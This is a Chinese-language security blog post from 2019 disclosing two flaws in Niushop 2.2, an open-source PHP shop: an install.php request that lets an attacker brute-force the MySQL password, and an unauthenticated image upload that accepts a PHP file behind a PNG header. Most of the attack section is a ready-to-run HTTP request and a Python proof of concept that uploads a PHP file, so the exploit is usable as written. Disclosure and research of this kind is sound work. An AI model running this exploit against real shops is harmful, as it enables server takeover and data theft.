---
title: "Niushop最新版 Getshell"
date: 2019-01-07T15:37:37+08:00
categories: ['代码审计']
tags: ['getshell','php']
---
Niushop开源商城采用thinkphp5.0+MySQL开发语言开发,完全开源商城系统,可以用于企业,个人建立自己的网上免费商城,支持开源微信商城,开源小程序,开源新零售。
<!--more-->
下载链接：http://www.niushop.com.cn/download.html
Version：单商户 2.2

### 安装爆破MySQL密码

```http
GET /niushop/install.php?action=true&dbserver=127.0.0.1&dbpassword=root2&dbusername=root&dbname=niushop_b2c HTTP/1.1
Host: 127.0.0.1
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Referer: http://127.0.0.1/niushop/install.php?refresh
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: action=db
Connection: close


```

![](https://y4er.com/img/uploads/20190509162868.jpg)

爆破成功返回1，密码错误返回0

### getshell

![](https://y4er.com/img/uploads/20190509165779.jpg)

上传图片只做了前端校验，抓包改后缀即可绕过。

对文件内容做了检查，文件大小不能过大或过小，合成马最好放到中间。

请求包截图，删除不必要的参数仍旧能够上传。

![](https://y4er.com/img/uploads/20190509163650.jpg)

所以导致**前台getshell**

### PoC

```python
import requests

session = requests.Session()

paramsGet = {"s":"/wap/upload/photoalbumupload"}
paramsPost = {"file_path":"upload/goods/","album_id":"30","type":"1,2,3,4"}
paramsMultipart = [('file_upload', ('themin.php', "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0bIDAT\x08\x99c\xf8\x0f\x04\x00\x09\xfb\x03\xfd\xe3U\xf2\x9c\x00\x00\x00\x00IEND\xaeB`\x82<? php phpinfo(); ?>", 'application/octet-stream'))]
headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0","Referer":"http://127.0.0.1/index.php?s=/admin/goods/addgoods","Connection":"close","Accept-Language":"en","Accept-Encoding":"gzip, deflate"}
cookies = {"action":"finish"}
response = session.post("http://127.0.0.1/index.php", data=paramsPost, files=paramsMultipart, params=paramsGet, headers=headers, cookies=cookies)

print("Status code:   %i" % response.status_code)
print("Response body: %s" % response.content)
```


参考链接

1. https://xz.aliyun.com/t/3767